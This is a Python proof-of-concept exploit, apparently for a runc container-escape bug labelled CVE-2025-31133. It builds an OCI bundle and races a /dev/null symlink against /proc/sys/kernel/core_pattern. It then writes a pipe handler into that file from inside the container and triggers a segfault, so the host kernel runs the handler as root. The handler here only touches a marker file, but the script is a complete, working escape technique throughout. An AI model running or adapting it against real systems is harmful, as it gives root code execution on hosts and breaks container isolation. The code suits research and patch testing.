import os
import stat
import pathlib
import itertools
import shutil
import json
import random
import subprocess
import multiprocessing
import time
import string
import ctypes


# When a process crashes, the kernel executes the core_pattern handler as root.
# For this PoC, we use /bin/touch to prove write access without compromising the system.
HANDLER_COMMAND = "|/bin/touch /pwned_by_cve_2025_31133"


OCI_CONFIG = {
    "ociVersion": "1.2.1",
    "process": {
        "terminal": False,
        "user": { "uid": 0, "gid": 0 },
        "args": [ "/bin/sh", "-c", "sleep 10" ], # Keep container alive for a bit.
        "env": [ "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", "LD_LIBRARY_PATH=/lib:/lib64" ],
        "cwd": "/",
        "noNewPrivileges": True, # Standard container security - doesn't prevent this exploit.
    },
    "root": { "path": "rootfs", "readonly": True },
    "mounts": [
        { "destination": "/proc", "type": "proc", "source": "proc" },
    ],
    "linux": {
        "namespaces": [
            { "type": "pid" },
            { "type": "network" },
            { "type": "ipc" },
            { "type": "uts" },
            { "type": "mount" },
            { "type": "cgroup" },
        ],
        "maskedPaths": [
            "/proc/acpi",
            "/proc/asound",
            "/proc/kcore",
            "/proc/keys",
            "/proc/latency_stats",
            "/proc/timer_list",
            "/proc/timer_stats",
            "/proc/sched_debug",
            "/sys/firmware",
            "/proc/scsi",
            "/proc/sys/kernel/core_pattern"
        ]
    }
}


def prepare_bundle() -> str:
    bundle_dir = pathlib.Path("bundle")
    rootfs_dir = bundle_dir / "rootfs"

    if bundle_dir.exists():
        shutil.rmtree(bundle_dir)

    (rootfs_dir / "bin").mkdir(parents=True, exist_ok=True)
    (rootfs_dir / "dev").mkdir(parents=True, exist_ok=True)
    (rootfs_dir / "proc").mkdir(parents=True, exist_ok=True)
    (rootfs_dir / "lib64").mkdir(parents=True, exist_ok=True)
    (rootfs_dir / "lib" / "x86_64-linux-gnu").mkdir(parents=True, exist_ok=True)

    for binary in ["sh", "echo", "sleep"]:
        host_path = pathlib.Path("/bin") / binary
        shutil.copy2(host_path, rootfs_dir / "bin" / binary)

    shutil.copy2("/lib64/ld-linux-x86-64.so.2", rootfs_dir / "lib64/ld-linux-x86-64.so.2")
    shutil.copy2("/lib/x86_64-linux-gnu/libc.so.6", rootfs_dir / "lib/x86_64-linux-gnu/libc.so.6")

    remove_null_device(str(rootfs_dir))
    mock_null_device(str(rootfs_dir))

    config_path = bundle_dir / "config.json"
    with open(config_path, "w+") as f:
        json.dump(OCI_CONFIG, f, indent=2)

    return str(bundle_dir.absolute())


def run_container(bundle_dir: str) -> str:
    name = random_string(32)
    subprocess.run(["runc", "run", "--detach", "--bundle", bundle_dir, name])
    return name


def trigger_race_condition(rootfs: str) -> None:
    while True:
        remove_null_device(rootfs)
        link_null_device(rootfs)
        time.sleep(0.0005) # 0.5 ms
        
        remove_null_device(rootfs)
        mock_null_device(rootfs)
        time.sleep(0.005) # 5 ms


def remove_null_device(rootfs: str) -> None:
    pathlib.Path(f"{rootfs}/dev/null").unlink(missing_ok=True)


def link_null_device(rootfs: str) -> None:
    os.symlink("/proc/sys/kernel/core_pattern", f"{rootfs}/dev/null")


def mock_null_device(rootfs: str) -> None:
    shutil.copy2("/dev/null", f"{rootfs}/dev/null")


def random_string(length: int) -> str:
    symbols = string.ascii_letters + string.digits
    return "".join(random.choices(symbols, k=length))


def try_exploit(bundle_dir: str) -> str | None:
    name = run_container(bundle_dir)
    print(f"Launched container: {name}")
    
    time.sleep(2) # Wait for container to stabilize.
    
    # Execute exploit in running container.
    subprocess.run([
        "runc", "exec", name, 
        "/bin/sh", "-c", 
        'echo "$1" > /proc/sys/kernel/core_pattern', 
        "sh", HANDLER_COMMAND
    ])

    with open("/proc/sys/kernel/core_pattern") as f:
        if f.read().strip() == HANDLER_COMMAND.strip():
            return name
    
    return None


def main() -> None:
    bundle_dir = prepare_bundle()
    rootfs = pathlib.Path(bundle_dir) / "rootfs"
    
    process = multiprocessing.Process(target=trigger_race_condition, args=(rootfs,))
    process.start()
    time.sleep(0.1) # Let race start.
    
    while not (name := try_exploit(bundle_dir)):
        print("Exploit did not succeed. Retrying...")
    print("Exploit succeeded!")

    process.terminate()

    # Trigger segmentation fault.
    subprocess.run([
        "runc", "exec", name,
        "/bin/sh", "-c",
        "kill -SEGV $$" 
    ])


if __name__ == "__main__":
    main()
